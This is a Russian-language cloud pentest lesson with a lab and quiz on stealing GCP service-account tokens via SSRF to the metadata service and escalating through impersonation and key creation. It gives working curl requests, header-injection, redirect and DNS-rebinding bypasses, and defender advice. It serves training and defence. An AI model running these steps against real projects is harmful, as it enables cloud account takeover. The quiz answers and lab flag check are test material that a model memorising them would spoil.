---
id: cloud-gcp-metadata
title: "GCP metadata: service-account токены и их захват"
category: cloud
parent: cloud-gcp-deep
difficulty: hard
order: 1
tags: [cloud, gcp, metadata, service-account, ssrf, oauth, gke]
prerequisites: [cloud-gcp-deep, cloud-ec2-ssrf]
useful_for:
  - "Захват сервисного аккаунта через SSRF/RCE в GCP"
  - "Пентест GCE, Cloud Run, Cloud Functions, GKE"
  - "Продвижение от токена к имперсонации"
estimated_minutes: 50
summary: "Как устроен metadata-сервис GCP, чем он отличается от AWS IMDS, как через SSRF/RCE получить OAuth-токен сервисного аккаунта и как из токена вырастить имперсонацию и доступ к ресурсам."
lab:
  kind: shell
  title: "Практика: GCP metadata — service-account токен и attributes"
  toolset: [core, curl]
  workdir: /home/student/gcpmeta
  files: [task.md, notes.md]
  check: "grep -q 'nto{' found.txt"
  hints:
    - "GCP metadata: `http://metadata.google.internal/computeMetadata/v1/` (заголовок Metadata-Flavor: Google)."
    - "Перечисли пользовательские атрибуты: `.../instance/attributes/`."
    - "Прочитай значение атрибута `flag`: `.../instance/attributes/flag` и сохрани в found.txt."

---

## Задача

На Cloud Run (серверлесс-контейнеры Google) ты нашёл SSRF — приложение по твоему URL делает HTTP-запрос. Как из этого получить доступ к облаку? В GCP нет «роли на инстансе», как в AWS: вместо этого у каждого ресурса есть привязанный **сервисный аккаунт (SA)**, а его **OAuth2-токен** выдаёт локальный **metadata-сервис**. Задача урока — украсть токен через SSRF и вырастить из него имперсонацию и доступ к ресурсам.

## Как устроен metadata-сервис GCP

Базовый адрес — `metadata.google.internal` (он же `169.254.169.254`):

```
http://metadata.google.internal/computeMetadata/v1/
```

**Главное отличие от AWS:** GCP требует заголовок `Metadata-Flavor: Google` на каждый запрос. Без него — `403 Forbidden`. Это частичная защита от «тупой» SSRF, которая не умеет добавлять заголовки, но обходится, если уязвимость позволяет инъекцию заголовков или редирект.

Полезные пути:

| Путь | Что отдаёт |
|------|-----------|
| `instance/service-accounts/default/token` | OAuth2 access token + `expires_in` |
| `instance/service-accounts/default/email` | email сервисного аккаунта |
| `instance/service-accounts/default/scopes` | список scopes |
| `project/project-id` | id проекта |
| `instance/attributes/?recursive=true` | кастомные метаданные (startup-script, ssh-keys) |

Ключевой нюанс GCP: **scope ≠ permission**. Токен может иметь scope `cloud-platform` (широкий доступ к API), но реальные права всё равно ограничены IAM-ролями SA. И наоборот: узкий scope отрезает API, даже если роль широкая. Поэтому после кражи проверяй и scopes, и фактические права.

## Данные, с которыми работаем

SSRF в Cloud Run принимает параметр `url` и делает GET. Прямой запрос к metadata выглядел бы так (изнутри ресурса):

```bash
$ curl -s -H "Metadata-Flavor: Google" \
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
{"access_token":"ya29...","expires_in":3599,"token_type":"Bearer"}
```

Но у нас SSRF, а не shell. Если SSRF умеет добавлять заголовки — отправляем `Metadata-Flavor: Google`. Если нет — пробуем обходы (о них ниже).

## Шаг 1: получаем токен через SSRF

Целимся в путь токена с нужным заголовком:

```
GET /fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
Header: Metadata-Flavor: Google
```

В ответе — JSON с `access_token`. Дальше работаем с ним как с `Bearer`.

## Шаг 2: узнаём, кто мы и что можем

```bash
$ curl -s -H "Authorization: Bearer $TOKEN" \
    "https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=$TOKEN" | jq '{email,scope,expires_in}'
{"email":"run-sa@my-project.iam.gserviceaccount.com","scope":"https://www.googleapis.com/auth/cloud-platform","expires_in":3599}
```

Токен от `run-sa`, scope широкий. Проверяем ресурсы:

```bash
$ curl -s -H "Authorization: Bearer $TOKEN" "https://storage.googleapis.com/storage/v1/b?project=my-project" | jq -r '.items[].name'
prod-backups
app-configs
```

## Шаг 3: имперсонация — самый быстрый рост прав

Если у SA есть право `iam.serviceAccounts.getAccessToken` (или `actAs`), можно выпустить токен **другого** SA — часто более привилегированного:

```bash
$ curl -s -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
    "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/admin-sa@my-project.iam.gserviceaccount.com:generateAccessToken" \
    -d '{"scope":["https://www.googleapis.com/auth/cloud-platform"],"lifetime":"3600s"}' | jq -r '.accessToken' | cut -c1-15
ya29.c.b0Aa
```

Теперь мы — `admin-sa`. Если у него роль `owner` на проект — доступ полный. При наличии `iam.serviceAccountKeys.create` выпускаем ключ для персистентности.

## Полный прогон от начала до конца

1. SSRF с заголовком `Metadata-Flavor: Google` → токен `run-sa`.
2. `tokeninfo` → email, scope, срок жизни.
3. Токен читает Storage (`prod-backups`).
4. `generateAccessToken` на `admin-sa` → имперсонация.
5. От имени admin — Secrets/Storage/ключи.

## Если не сработало

- **SSRF не ставит заголовок.** Тогда пробуй: инъекцию CRLF в URL, редирект с твоего сервера на metadata, `gopher://`, или компонент, который сам ставит `Metadata-Flavor` (некоторые Google SDK делают это автоматически).
- **DNS rebinding.** Если SSRF валидирует хост по имени, а резолвит повторно, перепривязка на `169.254.169.254` обходит allowlist.
- **Узкий scope.** Если scope `devstorage.read_only`, не трать время на IAM-эскалацию — ищи ресурс с широким scope.
- **Нет `getAccessToken`.** Токен без имперсонации всё равно может читать Secrets/Storage — не сдавайся после первой ошибки.
- **GKE.** Если под без Workload Identity, metadata может отдавать токен **node** SA (часто широкий) — это может быть лучше, чем KSA.
- **Metadata concealment.** В GKE под может не видеть node metadata — тогда работает только GKE metadata server.

## Сравнение metadata-сервисов трёх облаков

| Облако | Адрес | Заголовок | Особенность |
|--------|-------|-----------|-------------|
| AWS EC2 | 169.254.169.254 | IMDSv2: токен + `X-aws-ec2-metadata-token` | hop limit, IMDSv2 защищает от SSRF |
| GCP | metadata.google.internal | `Metadata-Flavor: Google` | scope ≠ permission, имперсонация |
| Azure | 169.254.169.254 | `Metadata: true` | `api-version`, managed identity |

Практический вывод: пейлоад под AWS не сработает на GCP без правильного заголовка, а логика имперсонации (`getAccessToken`) есть только в GCP. Поэтому после кражи токена всегда проверяй именно это право — оно часто даёт самый быстрый рост привилегий.

## GKE и Workload Identity

В GKE идентичность пода устроена иначе, и это важно. По умолчанию под обращается к metadata узла и получает токен сервисного аккаунта **ноды** — обычно `default` compute SA, который в старых кластерах имеет роль `Editor` на проект. То есть компромисс любого пода даёт широкий доступ. Чтобы это исправить, Google ввёл **Workload Identity**: под обращается к GKE metadata server, который выдаёт токен привязанного GSA (связь задаётся аннотацией KSA). Проверяя кластер, смотри: включён ли Workload Identity на node pool, какие роли у GSA, и кто имеет `iam.workloadIdentityUser`. Если Workload Identity не включён — под видит node SA, и это часто самая быстрая эскалация.

## Что мы теперь знаем

- Metadata GCP выдаёт OAuth2-токен SA; обязателен заголовок `Metadata-Flavor: Google`.
- Scope ограничивает API, а права задаёт IAM-роль SA.
- `iam.serviceAccounts.getAccessToken` — путь к имперсонации более привилегированного SA.
- Кастомные метаданные (`instance/attributes`) часто содержат startup-script с секретами.
- В GKE по умолчанию под может получать токен node SA — широкий доступ.

## На что смотреть дальше

- **cloud-gcp-iam**: роли и `setIamPolicy`.
- **cloud-gcp-wif**: как внешний IdP получает GCP-токен без ключей.
- **cloud-ec2-ssrf**: сравнение с AWS IMDS.

## Глазами защитника

GCP metadata-сервер требует заголовок `Metadata-Flavor: Google`, но это не защита от SSRF — атакующий добавит заголовок, если может управлять запросом. Защита — на уровне приложения: не проксировать произвольные URL, allow-list исходящих, экранирование. В GKE ограничивают доступ подов к metadata через Workload Identity и режим `GKE_METADATA`. В логах отслеживают обращения к metadata из приложений, которых там быть не должно. Отдельно следят за имперсонациями.

## Частые вопросы

**Почему заголовок `Metadata-Flavor` не защищает?**

SSRF-инъекция обычно позволяет задать заголовок, поэтому требование заголовка отсекает лишь тривиальные случаи. От реальной SSRF оно не спасает.

**Как получить токен через SSRF?**

Отправить запрос на `metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token` с нужным заголовком. Ответ содержит access token runtime service account.

**Что даёт имперсонация?**

Право `iam.serviceAccounts.getAccessToken`/`actAs` позволяет выписать токен другой SA. Так узкая роль превращается в широкую, вплоть до владельца проекта.

**Чем GCP metadata отличается от AWS IMDS?**

В AWS есть IMDSv2 с токеном и hop-limit; в GCP основная защита — приложение и заголовок, а не сам сервис. Поэтому SSRF в GCP часто результативнее.

**Как metadata помогает в GKE?**

Под обращается к metadata-серверу и получает токен привязанной Google SA. Если Workload Identity не настроен, отдаётся токен node SA — более широкий.

**Можно ли получить креды без SSRF?**

Да: RCE в контейнере, чтение смонтированного токена, доступ к переменным окружения. SSRF — лишь один из каналов.

**Как искать metadata-эндпоинт в чужом коде?**

Ищи строки `metadata.google.internal`, `computeMetadata`, `169.254.169.254` — они укажут, где приложение ходит за токенами.

**Как защититься?**

Не проксировать URL, allow-list egress, Workload Identity вместо node SA, ограничение `actAs`, мониторинг обращений к metadata.

## Разбор: SSRF → токен → весь проект

Приложение имеет эндпоинт, который подгружает «превью» по URL от пользователя. Атакующий передаёт `http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token` и добавляет заголовок `Metadata-Flavor: Google`. В ответ приходит access token runtime service account. С ним он перечисляет ресурсы проекта: бакеты, секреты, инстансы. Если у SA есть `actAs`, он имперсонирует более широкую SA и получает владельца проекта. Одна SSRF без валидации URL даёт весь проект. Защита — allow-list исходящих адресов, запрет на проксирование произвольных URL и Workload Identity вместо node-кред.

**Как защититься от SSRF конкретно?**

Не принимать URL от пользователя, использовать allow-list доменов, запрещать редиректы и блокировать доступ приложения к `metadata.google.internal` на сетевом уровне, кроме нужного режима GKE.

**Почему `169.254.169.254` вообще доступен приложению?**

Он нужен платформе для выдачи токенов. Приложение редко должно к нему ходить, а ограничение — задача сетевой конфигурации и кода.

**Можно ли получить токен без заголовка?**

Стандартно GCP требует `Metadata-Flavor: Google`. Иногда старые или неверно настроенные прокси не проверяют его, но рассчитывать на это не стоит.

## Квиз

Проверь себя.

```quiz
- question: "Какой заголовок обязателен для запроса к metadata-сервису GCP?"
  options:
    - "Metadata-Flavor: Google"
    - "X-aws-ec2-metadata-token"
    - "Metadata: true"
    - "Authorization: Bearer"
  answer: 0
  explanation: "GCP требует Metadata-Flavor: Google, иначе 403."
- question: "Что означает scope cloud-platform в GCP?"
  options:
    - "Доступ к API разрешён, но реальные права задаёт IAM-роль сервисного аккаунта"
    - "Полные права администратора"
    - "Только чтение Storage"
    - "Доступ отключён"
  answer: 0
  explanation: "Scope ограничивает API-поверхность, а permission определяются IAM-ролями."
- question: "Какое право позволяет выпустить токен другого сервисного аккаунта?"
  options:
    - "iam.serviceAccounts.getAccessToken"
    - "storage.objects.get"
    - "compute.instances.get"
    - "logging.logEntries.list"
  answer: 0
  explanation: "getAccessToken (и actAs) позволяет имперсонацию другого SA."
- question: "Где в metadata GCP часто лежат секреты и скрипты?"
  options:
    - "В instance/attributes/ (например, startup-script)"
    - "В instance/network-interfaces/"
    - "В project/project-id"
    - "В instance/identity"
  answer: 0
  explanation: "Кастомные метаданные содержат startup-script, ssh-keys и другие артефакты."
- question: "Почему в GKE под по умолчанию может получить широкий доступ?"
  options:
    - "Без Workload Identity он видит токен сервисного аккаунта узла (node SA)"
    - "Все поды имеют роль owner"
    - "Metadata не требует заголовка"
    - "GKE отключает IAM"
  answer: 0
  explanation: "Node SA часто имеет широкие роли (Editor), поэтому компромисс пода опасен."
```

## Куда дальше

В следующем уроке мы разберём **Cloud Functions и Cloud Run** как источники уязвимостей — инъекции и захват service account. А пока главное запомни: **в GCP SSRF превращается в токен SA, а `getAccessToken` превращает токен в имперсонацию — это два шага, которые надо проверить всегда.**

## Где пригодится

- **Пентест GCP:** SSRF/RCE на GCE, Cloud Run, Functions, GKE.
- **Red team:** эскалация от runtime SA к admin через имперсонацию.
- **Bug bounty:** облачные программы Google Cloud.
- **Blue team:** аудит прав SA и детект имперсонации.
